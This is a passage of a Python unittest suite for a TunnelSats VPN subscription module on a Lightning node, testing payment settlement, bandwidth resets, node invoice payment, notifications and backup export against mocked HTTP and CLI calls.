            (200, {}, fixture("api", "status_enabled.json").encode()),
        ]
        doc2 = self.run_verb("settle")
        self.assertEqual((0, "active", "protected"), (doc2["exit_code"], doc2["state"], doc2["verdict"]))
        self.assertIsNone(mod.load_pending(self.deps)["order"])
        self.assertEqual((["0.0.0.0/0", "::/0"], ["10.9.0.42/32"], 24556),
                         (mod.load_stored_config(self.deps)["allowed_ips"], mod.load_stored_config(self.deps)["addresses"],
                          mod.load_stored_config(self.deps)["vpn_port"]))

    def test_settle_claim_402_keeps_claiming(self):
        ph = "8" * 64
        pending = mod.empty_pending()
        pending["order"] = self.order_record(ph, "paid")
        mod.save_pending(self.deps, pending)
        self.fake.http_responses = [(402, {}, fixture("api", "error_payment_not_confirmed.json").encode())]
        doc = self.run_verb("settle")
        self.assertEqual((11, "claiming", True), (doc["exit_code"], doc["state"], doc["retryable"]))
        self.assertEqual("claiming", mod.load_pending(self.deps)["order"]["state"])

    def test_settle_order_poll_202_counts_as_paid(self):
        ph = "9" * 64
        self.fake.http_responses = [(202, {}, fixture("api", "order_processing.json").encode())]
        self.assertEqual(("ok", "processing"), mod.poll_order_status(self.deps, ph)[:2])

        pending = mod.empty_pending()
        pending["order"] = self.order_record(ph, "awaiting_payment")
        mod.save_pending(self.deps, pending)
        self.fake.http_responses = [
            (202, {}, fixture("api", "order_processing.json").encode()),
            (202, {}, fixture("api", "claim_processing.json").encode()),
        ]
        doc = self.run_verb("settle")
        self.assertEqual((11, "claiming"), (doc["exit_code"], doc["state"]))
        self.assertEqual(["/subscription/" + ph, "/subscription/claim"],
                         [url[url.index("/subscription/"):] for url, _payload in self.fake.http_calls[-2:]])

    def test_settle_renewal_confirms_without_restarting_tunnel_or_lightning(self):
        self.store()
        self.activate_conf()
        ph = "8" * 64
        pending = mod.empty_pending()
        pending["renewal"] = {
            "renewal_id": "ren-8", "payment_hash": ph, "invoice": make_bolt11("lnbc250u", payment_hash=ph),
            "amount_sats": 25000, "server_id": "de2", "months": 1,
            "old_expiry": "2026-12-01T00:00:00Z", "new_expiry": "2027-01-01T00:00:00Z",
            "public_key": ALICE_PUB, "created_at": "2026-10-14T12:00:00Z",
            "invoice_expires_at": "2026-10-14T13:00:00Z", "retained_until": "2026-10-15T12:00:00Z",
            "state": "awaiting_payment", "node_payment": {"state": "none", "result": None},
        }
        mod.save_pending(self.deps, pending)
        renewed_status = dict(fixture_json("api", "status_enabled.json"), expiry="2027-01-01T00:00:00Z")
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "paid"}).encode()),
            (200, {}, json.dumps(renewed_status).encode()),
        ]
        self.fake.calls.clear()
        doc = self.run_verb("settle", "--wait", "5")
        self.assertEqual((0, "confirmed", "2027-01-01T00:00:00Z"),
                         (doc["exit_code"], doc["state"], doc["new_expiry"]))
        self.assertIsNone(mod.load_pending(self.deps)["renewal"])
        self.assertEqual("2027-01-01T00:00:00Z", mod.load_state(self.deps)["valid_until"])
        self.assertEqual("2027-01-01T00:00:00Z", mod.load_stored_config(self.deps)["valid_until"])
        # No systemctl or internet.tunnelsats.sh install/restart calls during renewal!
        self.assertEqual([], [c for c in self.fake.calls if c[0] in ("systemctl", mod.ITS)])

    def test_settle_timeout_returns_exit_11(self):
        ph = "9" * 64
        pending = mod.empty_pending()
        pending["order"] = {
            "order_id": "ord-9", "payment_hash": ph, "private_key": ALICE_PRIV, "public_key": ALICE_PUB,
            "created_at": "2026-10-14T12:00:00Z", "invoice_expires_at": "2026-10-14T13:00:00Z",
            "retained_until": "2026-10-15T12:00:00Z", "state": "awaiting_payment",
            "node_payment": {"state": "none", "result": None},
        }
        mod.save_pending(self.deps, pending)
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "pending"}).encode()),
            (200, {}, json.dumps({"status": "pending"}).encode()),
        ]
        doc = self.run_verb("settle", "--wait", "3")
        self.assertEqual((11, "awaiting_payment", [3]), (doc["exit_code"], doc["state"], self.fake.sleeps))


class TestNotificationsAndTickHooks(ModuleTestCase):
    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()
        self.record(decision="hybrid", reason="ok")
        self.fake.conf_set("notify", "on")

    def notifies(self):
        return self.fake.calls_of(mod.NOTIFY, "send")

    def test_tick_test_hooks_tc38_and_raw_api(self):
        # --now or --status-file without --no-persist is refused with E_USAGE
        self.assertEqual((2, "E_USAGE"), (self.run_verb("tick", "--now", "2026-11-29T00:00:00Z")["exit_code"],
                                          self.run_verb("tick", "--now", "2026-11-29T00:00:00Z")["error"]))
        self.assertEqual((2, "E_USAGE"), (self.run_verb("tick", "--status-file", "/tmp/x")["exit_code"],
                                          self.run_verb("tick", "--status-file", "/tmp/x")["error"]))

        # status --raw-api returns validated API fields and no key material
        raw_doc = self.run_verb("status", "--cached", "--raw-api")
        self.assertIn("raw_api", raw_doc)
        self.assertEqual("enabled", raw_doc["status"])
        self.assertEqual("enabled", raw_doc["raw_api"]["status"])
        self.assertEqual(0, raw_doc["bandwidth_resets_this_month"])
        for forbidden in ("private_key", "PrivateKey", "presharedKey", "preshared_key", "fullConfig", "config"):
            self.assertNotIn(forbidden, raw_doc["raw_api"])

        # TC-38: 48h before expiry -> expiry_soon; 1h after expiry -> expired; notify_state on disk unchanged
        doc_soon = self.run_verb("tick", "--now", "2026-11-29T00:00:00Z", "--no-persist")
        self.assertTrue(doc_soon["test_hook"])
        self.assertEqual([{"event": "expiry_soon", "outcome": "handed_off", "attempt": 1}], doc_soon["notifications"])
        doc_exp = self.run_verb("tick", "--now", "2026-12-01T01:00:00Z", "--no-persist")
        self.assertTrue(doc_exp["test_hook"])
        self.assertEqual([{"event": "expired", "outcome": "handed_off", "attempt": 1}], doc_exp["notifications"])
        self.assertIsNone(mod.load_state(self.deps).get("notify_state"))

        # TC-38: --status-file bandwidth_high (85/100) and bandwidth_exhausted (100/100 disabled)
        st85 = dict(raw_doc, bandwidth_used_gb=85, bandwidth_limit_gb=100)
        st100 = dict(raw_doc, bandwidth_used_gb=100, bandwidth_limit_gb=100, status="disabled")
        self.write("tmp/st85.json", json.dumps(st85))
        self.write("tmp/st100.json", json.dumps(st100))
        doc_bw85 = self.run_verb("tick", "--status-file", "/tmp/st85.json", "--no-persist")
        self.assertEqual([{"event": "bandwidth_high", "outcome": "handed_off", "attempt": 1}],
                         doc_bw85["notifications"])
        doc_bw100 = self.run_verb("tick", "--status-file", "/tmp/st100.json", "--no-persist")
        self.assertEqual([{"event": "bandwidth_exhausted", "outcome": "handed_off", "attempt": 1}],
                         doc_bw100["notifications"])
        self.assertIsNone(mod.load_state(self.deps).get("notify_state"))

    def test_verdict_transitions_tc18_and_tc39(self):
        # TC-18: degraded once, deduplicated on second tick, all_clear on recovery
        degraded_doc = fixture_json("verify", "activating_tunnel_up.json")
        for c in degraded_doc["checks"]:
            if c["id"] == "wg_handshake":
                c["result"] = "fail"
                c["detail"] = "no handshake"
        self.fake.its["verify --no-probe"] = (5, degraded_doc)
        d1 = self.run_verb("tick")
        self.assertEqual([{"event": "verdict_degraded", "outcome": "handed_off", "attempt": 1}], d1["notifications"])
        d2 = self.run_verb("tick")
        self.assertEqual([], d2["notifications"])
        self.fake.its["verify --no-probe"] = (0, fixture_json("verify", "protected.json"))
        d3 = self.run_verb("tick")
        self.assertEqual([{"event": "all_clear", "outcome": "handed_off", "attempt": 1}], d3["notifications"])
        d4 = self.run_verb("tick")
        self.assertEqual([], d4["notifications"])

        # TC-39a: unsafe once, then all_clear on recovery
        unsafe_doc = dict(fixture_json("verify", "protected.json"), verdict="unsafe", exit_code=4, ok=False)
        self.fake.its["verify --no-probe"] = (4, unsafe_doc)
        u1 = self.run_verb("tick")
        self.assertEqual([{"event": "verdict_unsafe", "outcome": "handed_off", "attempt": 1}], u1["notifications"])
        self.fake.its["verify --no-probe"] = (0, fixture_json("verify", "protected.json"))
        u2 = self.run_verb("tick")
        self.assertEqual([{"event": "all_clear", "outcome": "handed_off", "attempt": 1}], u2["notifications"])

        # TC-39b: notify=off -> skipped_disabled; re-enabling notify=on does not retroactively send or emit all_clear
        self.fake.conf_set("notify", "off")
        self.fake.its["verify --no-probe"] = (5, degraded_doc)
        s1 = self.run_verb("tick")
        self.assertEqual([{"event": "verdict_degraded", "outcome": "skipped_disabled", "attempt": 0}],
                         s1["notifications"])
        self.fake.conf_set("notify", "on")
        self.assertEqual([], self.run_verb("tick")["notifications"])
        self.fake.its["verify --no-probe"] = (0, fixture_json("verify", "protected.json"))
        self.assertEqual([], self.run_verb("tick")["notifications"])

        # TC-39c: notify delivery failure -> failed on attempt 1, succeeds on attempt 2, then all_clear
        self.fake.notify_rc = 1
        self.fake.its["verify --no-probe"] = (5, degraded_doc)
        f1 = self.run_verb("tick")
        self.assertEqual([{"event": "verdict_degraded", "outcome": "failed", "attempt": 1}], f1["notifications"])
        self.fake.notify_rc = 0
        f2 = self.run_verb("tick")
        self.assertEqual([{"event": "verdict_degraded", "outcome": "handed_off", "attempt": 2}], f2["notifications"])
        self.fake.its["verify --no-probe"] = (0, fixture_json("verify", "protected.json"))
        f3 = self.run_verb("tick")
        self.assertEqual([{"event": "all_clear", "outcome": "handed_off", "attempt": 1}], f3["notifications"])

    def test_tick_background_settlement_tc37_and_6h_sync(self):
        # TC-37: background order settlement in tick emits payment_received and activation_done
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.conf_set("tunnelsats", "off")
        self.fake.conf_set("autoUnlock", "on")
        self.fake.conf_set("notify", "on")
        self.fake.its["verify"] = (0, fixture_json("verify", "protected.json"))
        ph = "a" * 64
        pending = mod.empty_pending()
        pending["order"] = {
            "order_id": "ord-bg", "payment_hash": ph, "invoice": make_bolt11("lnbc250u", payment_hash=ph),
            "amount_sats": 25000, "server_id": "de2", "months": 1, "impl": "lnd",
            "private_key": ALICE_PRIV, "public_key": ALICE_PUB,
            "created_at": "2026-10-14T12:00:00Z", "invoice_expires_at": "2026-10-14T13:00:00Z",
            "retained_until": "2026-10-15T12:00:00Z", "state": "awaiting_payment",
            "node_payment": {"state": "none", "result": None},
        }
        mod.save_pending(self.deps, pending)
        claim_doc = fixture_json("api", "claim_client_held.json")
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "paid"}).encode()),
            (200, {}, json.dumps(claim_doc).encode()),
            (200, {}, fixture("api", "status_enabled.json").encode()),
        ]
        doc = self.run_verb("tick")
        self.assertEqual(["payment_received", "activation_done"], [n["event"] for n in doc["notifications"]])
        self.assertEqual("active", doc["settle"]["state"])

        # 6-hour status sync in tick when checked_at is older than 6h
        state = mod.load_state(self.deps)
        state["api"]["checked_at"] = "2026-10-14T01:00:00Z"
        mod.save_state(self.deps, state)
        updated_status = dict(fixture_json("api", "status_enabled.json"), bandwidth_used_gb=9.5)
        self.fake.http_responses = [(200, {}, json.dumps(updated_status).encode())]
        self.run_verb("tick")
        self.assertEqual(9.5, mod.load_state(self.deps)["api"]["data"]["bandwidth_used_gb"])


# ------------------------------------------------------------------------------------------
# topup (bandwidth reset) and reset settlement (P4 Commit 1)
# ------------------------------------------------------------------------------------------

class TestTopupAndResetSettle(ModuleTestCase):
    def test_topup_creates_reuses_and_handles_reset_limit(self):
        # Unconfigured node refuses topup
        doc_unconf = self.run_verb("topup", "--pay", "none")
        self.assertEqual((3, "E_NOT_CONFIGURED"), (doc_unconf["exit_code"], doc_unconf["error"]))

        self.store()
        ph = "b" * 64
        inv = make_bolt11("lnbc50u", payment_hash=ph, expiry=900)
        self.fake.http_responses = [(200, {}, json.dumps({
            "resetId": "rst-1", "paymentHash": ph, "invoice": inv, "amountSats": 5000,
            "expiresAt": "2026-10-14T12:15:00Z",
        }).encode())]
        doc1 = self.run_verb("topup", "--pay", "none")
        self.assertEqual((0, "awaiting_payment", False, "rst-1", ph, 5000, "de2"),
                         (doc1["exit_code"], doc1["state"], doc1["reused"], doc1["reset_id"],
                          doc1["payment_hash"], doc1["amount_sats"], doc1["server_id"]))
        self.assertEqual({"wgPublicKey": ALICE_PUB, "serverId": "de2"}, self.fake.http_calls[-1][1])
        self.assertIn([mod.ITS, "tick-timer", "on"], self.fake.calls)

        # Second topup while invoice is unexpired polls reset status (pending) and reuses same invoice (TC-21)
        self.fake.http_calls.clear()
        self.fake.http_responses = [(200, {}, json.dumps({"status": "pending", "type": "bandwidth_reset"}).encode())]
        doc2 = self.run_verb("topup", "--pay", "none")
        self.assertEqual((0, True, ph), (doc2["exit_code"], doc2["reused"], doc2["payment_hash"]))
        self.assertEqual([(mod.API_SUBSCRIPTION_URL + "/" + ph, None)], self.fake.http_calls)

        # If poll during reuse shows paid/processing, refuses with E_ORDER_PENDING and marks reset paid
        self.fake.http_responses = [(202, {}, json.dumps({"status": "processing", "type": "bandwidth_reset"}).encode())]
        doc_paid = self.run_verb("topup", "--pay", "none")
        self.assertEqual((14, "E_ORDER_PENDING"), (doc_paid["exit_code"], doc_paid["error"]))
        self.assertEqual("paid", mod.load_pending(self.deps)["reset"]["state"])

        # Clear pending reset and test 429 monthly reset limit vs generic 429 rate limit
        mod.save_pending(self.deps, mod.empty_pending())
        self.fake.http_responses = [(429, {}, b'{"message": "Maximum 2 resets per month reached"}')]
        doc_lim = self.run_verb("topup", "--pay", "none")
        self.assertEqual((14, "E_RESET_LIMIT"), (doc_lim["exit_code"], doc_lim["error"]))

        self.fake.http_responses = [(429, {}, b'{"message": "Too many requests"}')]
        doc_rl = self.run_verb("topup", "--pay", "none")
        self.assertEqual((13, "E_RATE_LIMITED"), (doc_rl["exit_code"], doc_rl["error"]))

    def test_settle_reset_confirms_and_clears_bandwidth_notifications(self):
        self.store()
        self.activate_conf()
        state = mod.load_state(self.deps)
        state["notify_state"] = {
            "expiry_cycle": "2026-12-01T00:00:00.000Z",
            "bandwidth_cycle": "2026-12-01T00:00:00.000Z:0",
            "verdict_seq": 0,
            "last_verdict": "protected",
            "verdict_warning_handed_off": False,
            "daily": {"date": "2026-10-14", "count": 0},
            "events": {
                "bandwidth_high": {"cycle": "2026-12-01T00:00:00.000Z:0", "attempts": 1, "outcome": "handed_off"},
                "bandwidth_exhausted": {"cycle": "2026-12-01T00:00:00.000Z:0", "attempts": 1, "outcome": "handed_off"},
            },
        }
        mod.save_state(self.deps, state)

        ph = "c" * 64
        pending = mod.empty_pending()
        pending["reset"] = {
            "reset_id": "rst-c", "payment_hash": ph, "invoice": make_bolt11("lnbc50u", payment_hash=ph),
            "amount_sats": 5000, "server_id": "de2", "public_key": ALICE_PUB,
            "created_at": "2026-10-14T12:00:00Z", "invoice_expires_at": "2026-10-14T12:15:00Z",
            "retained_until": "2026-10-15T12:00:00Z", "state": "awaiting_payment",
            "old_resets": 0, "old_used_gb": 85.0,
            "node_payment": {"state": "none", "result": None},
        }
        mod.save_pending(self.deps, pending)

        reset_status = dict(fixture_json("api", "status_enabled.json"),
                            bandwidth_used_gb=0.0, bandwidth_resets_this_month=1)
        # Pass 1: 202 processing -> waits 5s; Pass 2: 200 paid + api_status -> confirmed
        self.fake.http_responses = [
            (202, {}, json.dumps({"status": "processing", "type": "bandwidth_reset"}).encode()),
            (200, {}, json.dumps({"status": "paid", "type": "bandwidth_reset"}).encode()),
            (200, {}, json.dumps(reset_status).encode()),
        ]
        self.fake.calls.clear()
        doc = self.run_verb("settle", "--wait", "10")
        self.assertEqual((0, "reset", "confirmed", 0.0, 1, [5]),
                         (doc["exit_code"], doc["kind"], doc["state"], doc["bandwidth_used_gb"],
                          doc["resets_this_month"], self.fake.sleeps))
        self.assertIsNone(mod.load_pending(self.deps)["reset"])
        new_state = mod.load_state(self.deps)
        self.assertEqual(1, new_state["api"]["data"]["resets_this_month"])
        self.assertEqual({}, new_state["notify_state"]["events"])
        self.assertEqual([], [c for c in self.fake.calls if c[0] in ("systemctl", mod.ITS)])

    def test_settle_reset_server_failure_marks_needs_support(self):
        self.store()
        ph = "d" * 64
        pending = mod.empty_pending()
        pending["reset"] = {
            "reset_id": "rst-d", "payment_hash": ph, "invoice": make_bolt11("lnbc50u", payment_hash=ph),
            "amount_sats": 5000, "server_id": "de2", "public_key": ALICE_PUB,
            "created_at": "2026-10-14T12:00:00Z", "invoice_expires_at": "2026-10-14T12:15:00Z",
            "retained_until": "2026-10-15T12:00:00Z", "state": "paid",
            "old_resets": 0, "old_used_gb": 90.0,
            "node_payment": {"state": "none", "result": None},
        }
        mod.save_pending(self.deps, pending)
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "failed", "type": "bandwidth_reset"}).encode()),
        ]
        doc = self.run_verb("settle")
        self.assertEqual((12, "E_RESET_FAILED"), (doc["exit_code"], doc["error"]))
        self.assertEqual("needs_support", mod.load_pending(self.deps)["reset"]["state"])


# ------------------------------------------------------------------------------------------
# pay-node (LND and CLN node payment with preflight and 1% fee cap, P4 Commit 2)
# ------------------------------------------------------------------------------------------

class TestPayNode(ModuleTestCase):
    PREIMAGE_1 = "11" * 32
    HASH_1 = hashlib.sha256(bytes.fromhex(PREIMAGE_1)).hexdigest()
    PREIMAGE_2 = "22" * 32
    HASH_2 = hashlib.sha256(bytes.fromhex(PREIMAGE_2)).hexdigest()

    def valid_claim_doc(self, pub=ALICE_PUB):
        doc = fixture_json("api", "claim_client_held.json")
        doc["peer"]["publicKey"] = pub
        return doc

    def test_lnd_pay_node_preflight_errors_and_success(self):
        self.record()
        # pay-node without --yes requires confirmation
        self.assertEqual((2, "E_CONFIRMATION_REQUIRED"),
                         (self.run_verb("pay-node")["exit_code"], self.run_verb("pay-node")["error"]))
        # pay-node with no pending item returns E_NO_PENDING
        self.assertEqual((3, "E_NO_PENDING"),
                         (self.run_verb("pay-node", "--yes")["exit_code"], self.run_verb("pay-node", "--yes")["error"]))

        inv = make_bolt11("lnbc250u", payment_hash=self.HASH_1, expiry=3600)
        self.fake.http_responses = [(200, {}, json.dumps({
            "orderId": "ord-pay1", "paymentHash": self.HASH_1, "invoice": inv, "amountSats": 25000,
        }).encode())]
        self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "none")

        # 1. Wallet locked (listpayments rc != 0) -> E_PAY_NODE_LOCKED (exit 10), order stays awaiting_payment
        self.fake.http_responses = [(200, {}, json.dumps({"status": "pending"}).encode())]
        self.fake.lnd_listpayments = (1, "", "wallet locked")
        doc_lock = self.run_verb("pay-node", "--yes")
        self.assertEqual((10, "E_PAY_NODE_LOCKED"), (doc_lock["exit_code"], doc_lock["error"]))
        self.assertEqual("awaiting_payment", mod.load_pending(self.deps)["order"]["state"])

        # 2. decodepayreq amount mismatch -> E_INVOICE_MISMATCH (exit 12), payinvoice never called
        self.fake.http_responses = [(200, {}, json.dumps({"status": "pending"}).encode())]
        self.fake.lnd_listpayments = (0, {"payments": []})
        self.fake.lnd_decodepayreq = (0, {"payment_hash": self.HASH_1, "num_satoshis": "99000"})
        doc_mis = self.run_verb("pay-node", "--yes")
        self.assertEqual((12, "E_INVOICE_MISMATCH"), (doc_mis["exit_code"], doc_mis["error"]))
        self.assertEqual([], [c for c in self.fake.calls if "payinvoice" in c])
        self.fake.lnd_decodepayreq = None

        # 3. Unfunded / no route / insufficient balance mappings (exit 10), invoice stays retryable
        for reason_str, expected_code in (
            ("FAILURE_REASON_NO_ROUTE", "E_PAY_NO_ROUTE"),
            ("FAILURE_REASON_INSUFFICIENT_BALANCE", "E_PAY_INSUFFICIENT_BALANCE"),
        ):
            self.fake.http_responses = [(200, {}, json.dumps({"status": "pending"}).encode())]
            self.fake.lnd_listpayments = (0, {"payments": []})
            self.fake.lnd_payinvoice = (1, {"status": "FAILED", "failure_reason": reason_str}, "")
            doc_err = self.run_verb("pay-node", "--yes")
            self.assertEqual((10, expected_code, 250),
                             (doc_err["exit_code"], doc_err["error"], doc_err["fee_limit_sats"]))
            self.assertEqual("awaiting_payment", mod.load_pending(self.deps)["order"]["state"])
            self.assertEqual("failed", mod.load_pending(self.deps)["order"]["node_payment"]["state"])

        # 4. Already paid in LND listpayments -> E_ALREADY_PAID (exit 14), marks order paid without calling payinvoice
        self.fake.calls.clear()
        self.fake.http_responses = [(200, {}, json.dumps({"status": "pending"}).encode())]
        self.fake.lnd_listpayments = (0, {"payments": [{"payment_hash": self.HASH_1, "status": "SUCCEEDED"}]})
        doc_dup = self.run_verb("pay-node", "--yes")
        self.assertEqual((14, "E_ALREADY_PAID"), (doc_dup["exit_code"], doc_dup["error"]))
        self.assertEqual([], [c for c in self.fake.calls if "payinvoice" in c])
        self.assertEqual("paid", mod.load_pending(self.deps)["order"]["state"])

        # Reset order to awaiting_payment and test full LND payinvoice -> preimage verification -> claim -> active
        pending = mod.load_pending(self.deps)
        order_pub = pending["order"]["public_key"]
        pending["order"]["state"] = "awaiting_payment"
        pending["order"]["node_payment"] = {"state": "none", "result": None}
        mod.save_pending(self.deps, pending)
        self.fake.lnd_listpayments = (0, {"payments": []})
        self.fake.lnd_payinvoice = (0, {
            "status": "SUCCEEDED",
            "payment_preimage": self.PREIMAGE_1,
            "payment_hash": self.HASH_1,
            "fee_sat": "12",
        }, "")
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "pending"}).encode()),
            (200, {}, json.dumps(self.valid_claim_doc(pub=order_pub)).encode()),
            (200, {}, fixture("api", "status_enabled.json").encode()),
        ]
        doc_ok = self.run_verb("pay-node", "--yes")
        self.assertEqual((0, "order", "active", "protected", 250),
                         (doc_ok["exit_code"], doc_ok["kind"], doc_ok["state"], doc_ok["verdict"], doc_ok["fee_limit_sats"]))
        self.assertEqual(("succeeded", 12, True),
                         (doc_ok["node_payment"]["state"], doc_ok["node_payment"]["fee_sats"],
                          doc_ok["node_payment"]["preimage_verified"]))
        self.assertIn(
            mod.LNCLI + ["payinvoice", "--force", "--json", "--timeout", "60s", "--fee_limit", "250", "--pay_req", inv],
            self.fake.calls,
        )
        self.assertIsNone(mod.load_pending(self.deps)["order"])

    def test_cln_topup_pay_node_and_error_mappings(self):
        self.store(impl="cl")
        self.activate_conf(impl="cl")
        inv = make_bolt11("lnbc50u", payment_hash=self.HASH_2, expiry=900)

        # CLN code 205 (no route) during topup --pay node --yes -> creates reset invoice, fails payment with E_PAY_NO_ROUTE
        self.fake.http_responses = [
            (200, {}, json.dumps({
                "resetId": "rst-cln", "paymentHash": self.HASH_2, "invoice": inv, "amountSats": 5000,
            }).encode()),
            (200, {}, json.dumps({"status": "pending", "type": "bandwidth_reset"}).encode()),
        ]
        self.fake.cln_listpays = (0, {"pays": []})
        self.fake.cln_pay = (1, {"code": 205, "message": "Could not find a route"}, "")
        doc_nr = self.run_verb("topup", "--pay", "node", "--yes")
        self.assertEqual((10, "E_PAY_NO_ROUTE", 50),
                         (doc_nr["exit_code"], doc_nr["error"], doc_nr["fee_limit_sats"]))
        self.assertIn(
            mod.CLNCLI + ["-k", "pay", "bolt11=" + inv, "maxfee=50000msat", "retry_for=60"],
            self.fake.calls,
        )

        # CLN insufficient funds -> E_PAY_INSUFFICIENT_BALANCE
        self.fake.http_responses = [(200, {}, json.dumps({"status": "pending", "type": "bandwidth_reset"}).encode())]
        self.fake.cln_pay = (1, {"code": -32602, "message": "Could not afford 5000000msat: insufficient funds"}, "")
        doc_ib = self.run_verb("pay-node", "--kind", "reset", "--impl", "cl", "--yes")
        self.assertEqual((10, "E_PAY_INSUFFICIENT_BALANCE"), (doc_ib["exit_code"], doc_ib["error"]))

        # CLN payment succeeds -> verifies preimage -> settles bandwidth reset
        reset_status = dict(fixture_json("api", "status_enabled.json"),
                            bandwidth_used_gb=0.0, bandwidth_resets_this_month=1)
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "pending", "type": "bandwidth_reset"}).encode()),
            (200, {}, json.dumps({"status": "paid", "type": "bandwidth_reset"}).encode()),
            (200, {}, json.dumps(reset_status).encode()),
        ]
        self.fake.cln_pay = (0, {
            "status": "complete",
            "payment_preimage": self.PREIMAGE_2,
            "payment_hash": self.HASH_2,
            "amount_msat": "5000000msat",
            "amount_sent_msat": "5004000msat",
        }, "")
        doc_ok = self.run_verb("pay-node", "--kind", "reset", "--impl", "cl", "--yes")
        self.assertEqual((0, "reset", "confirmed", 50, 4),
                         (doc_ok["exit_code"], doc_ok["kind"], doc_ok["state"],
                          doc_ok["fee_limit_sats"], doc_ok["node_payment"]["fee_sats"]))
        self.assertIsNone(mod.load_pending(self.deps)["reset"])


# ------------------------------------------------------------------------------------------
# export (BACKUP) and P4 menu flows (P4 Commit 3)
# ------------------------------------------------------------------------------------------

class TestExportAndMenuP4(ModuleTestCase):
    def test_export_and_import_dry_run_round_trip_tc22(self):
        os.makedirs(self.path("/home/admin"), exist_ok=True)
        out_file = self.path("/home/admin/ts-backup.conf")
        # Unconfigured node refuses export
        doc_unconf = self.run_verb("export", "--out", out_file)
        self.assertEqual((3, "E_NOT_CONFIGURED"), (doc_unconf["exit_code"], doc_unconf["error"]))

        self.store()
        # Missing parent directory is refused with E_USAGE
        doc_noparent = self.run_verb("export", "--out", self.path("/nonexistent/dir/ts-backup.conf"))
        self.assertEqual((2, "E_USAGE"), (doc_noparent["exit_code"], doc_noparent["error"]))

        # Symlink target is refused with E_USAGE
        sym_path = self.path("/home/admin/sym-backup.conf")
        os.symlink(out_file, sym_path)
        doc_sym = self.run_verb("export", "--out", sym_path)
        self.assertEqual((2, "E_USAGE"), (doc_sym["exit_code"], doc_sym["error"]))

        # Valid export writes 0600 canonical config and leaks no key material in JSON
        doc_exp = self.run_verb("export", "--out", out_file)
        self.assertEqual((0, True, out_file, "0600", "admin", ALICE_PUB, 24556),
                         (doc_exp["exit_code"], doc_exp["exported"], doc_exp["file"],
                          doc_exp["mode"], doc_exp["owner"], doc_exp["public_key"], doc_exp["vpn_port"]))
        self.assertNotIn(ALICE_PRIV, json.dumps(doc_exp))
        st = os.stat(out_file)
        self.assertEqual(0o600, st.st_mode & 0o777)

        # TC-22: import --file <exported> --dry-run round-trips cleanly
        doc_imp = self.run_verb("import", "--file", out_file, "--dry-run")
        self.assertEqual((0, True, True, ALICE_PUB),
                         (doc_imp["exit_code"], doc_imp["valid"], doc_imp["dry_run"], doc_imp["public_key"]))

        # Pending reset offers RESUME in menu_choices
        pending = mod.empty_pending()
        pending["reset"] = {"reset_id": "rst-m", "payment_hash": "e" * 64, "state": "awaiting_payment"}
        mod.save_pending(self.deps, pending)
        tags = [tag for tag, _ in mod.menu_choices(self.deps, mod.load_state(self.deps), mod.read_rb_conf(self.deps))[0]]
        self.assertIn("RESUME", tags)
        self.assertIn("TOPUP", tags)
        self.assertIn("BACKUP", tags)


class TestSchemaCheck(unittest.TestCase):
    def test_const_and_enum_distinguish_booleans_from_numbers(self):
        base = {
            "contract": 1,
            "command": "status",
            "module_version": "0.1.0",
            "ok": True,
            "exit_code": 0,
            "errors": [],
        }
        self.assertEqual([], schema_check.validate(base, ENVELOPE))
        self.assertEqual(["$.contract: expected 1"], schema_check.validate({**base, "contract": True}, ENVELOPE))
        self.assertEqual(
            ["$.exit_code: False not in [0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14]"],
            schema_check.validate({**base, "exit_code": False}, ENVELOPE),
        )
        self.assertEqual(
            ["$.exit_code: True not in [0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14]"],
            schema_check.validate({**base, "exit_code": True}, ENVELOPE),
        )
        self.assertEqual(["$: expected True"], schema_check.validate(1, {"const": True}))
        self.assertEqual(["$: 0 not in [False, True]"], schema_check.validate(0, {"enum": [False, True]}))


if __name__ == "__main__":
    unittest.main()


